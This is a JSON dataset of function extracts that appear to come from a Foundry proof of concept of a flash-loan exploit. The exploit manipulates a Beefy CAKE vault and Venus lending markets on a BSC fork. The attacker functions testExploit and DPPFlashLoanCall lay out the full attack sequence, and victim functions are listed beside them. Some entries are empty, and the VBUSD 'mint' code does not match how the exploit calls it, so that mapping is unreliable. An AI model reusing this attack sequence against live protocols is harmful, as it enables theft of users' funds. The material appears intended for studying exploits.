[
  {
    "contract/interface": "StrategySyrup",
    "source_type": "victim_contract",
    "function_name": "harvest",
    "original_code": "    function harvest() public {\n        require(!Address.isContract(msg.sender), \"!contract\");\n        IMasterChef(masterchef).leaveStaking(0);\n        ISmartChef(smartchef).deposit(0);\n        doswap();\n        dosplit();\n        deposit();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        address[] memory cTokens = new address[](2);\n        cTokens[0] = address(vBUSD);\n        cTokens[1] = address(vCAKE);\n        unitroller.enterMarkets(cTokens);\n        BUSD.approve(address(vBUSD), type(uint256).max);\n        vBUSD.mint(BUSD.balanceOf(address(this)));\n        vCAKE.borrow(50_000 * 1e18);\n        CAKE.approve(address(beefyVault), type(uint256).max);\n        beefyVault.depositAll();\n        // Removing this step, the profit seem to be higher \ud83d\ude02\n        // because the harveset() funciton will swap some CAKE to WBNB\n        Harvest harvest = new Harvest();\n        beefyVault.withdrawAll();\n        CAKE.approve(address(vCAKE), type(uint256).max);\n        vCAKE.repayBorrow(50_000 * 1e18);\n        vBUSD.redeemUnderlying(400_000 * 1e18);\n        BUSD.transfer(dodo, 400_000 * 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        // the ankr rpc maybe dont work , please use QuickNode\n        cheats.createSelectFork(\"bsc\", 22_832_427);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        address(WBNB).call{value: 3 ether}(\"\");\n        WBNBToCTK();\n        CTK.transfer(address(SmartChef), CTK.balanceOf(address(this)));\n        DVM(dodo).flashLoan(0, 400_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"[End] Attacker CAKE balance after exploit\", CAKE.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BeefyVault",
    "source_type": "victim_contract",
    "function_name": "depositAll",
    "original_code": "    function depositAll() external {\n        deposit(token.balanceOf(msg.sender));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BeefyVault",
    "source_type": "victim_contract",
    "function_name": "withdrawAll",
    "original_code": "    function withdrawAll() external {\n        withdraw(balanceOf(msg.sender));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VCAKE",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "    function borrow(uint borrowAmount) external returns (uint) {\n        borrowAmount; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VCAKE",
    "source_type": "victim_contract",
    "function_name": "repayBorrow",
    "original_code": "    function repayBorrow(uint repayAmount) external returns (uint) {\n        repayAmount; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VBUSD",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "  function mint(\n    string memory ctkTxHash,\n    address account,\n    uint256 amount\n  ) public onlyOperator returns (bool) {\n    require(\n      bytes(ctkTxHash).length != 0,\n      \"BEP20: transaction hash should not be empty\"\n    );\n    string memory uppercaseTxHash = _toUpper(ctkTxHash);\n    require(_ctkTxMap[uppercaseTxHash] == 0, \"BEP20: transaction hash exists\");\n    require(\n      _operatorQuota[msg.sender] >= amount,\n      \"operator quota is insufficient, please rotate operator key\"\n    );\n\n    _operatorQuota[msg.sender] -= amount;\n    _ctkTxMap[uppercaseTxHash] = amount;\n    _mint(account, amount);\n\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VBUSD",
    "source_type": "victim_contract",
    "function_name": "redeemUnderlying",
    "original_code": "    function redeemUnderlying(uint redeemAmount) external returns (uint) {\n        redeemAmount; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Unitroller",
    "source_type": "victim_contract",
    "function_name": "enterMarkets",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Unitroller",
    "source_type": "victim_contract",
    "function_name": "getAccountLiquidity",
    "original_code": "",
    "description": ""
  }
]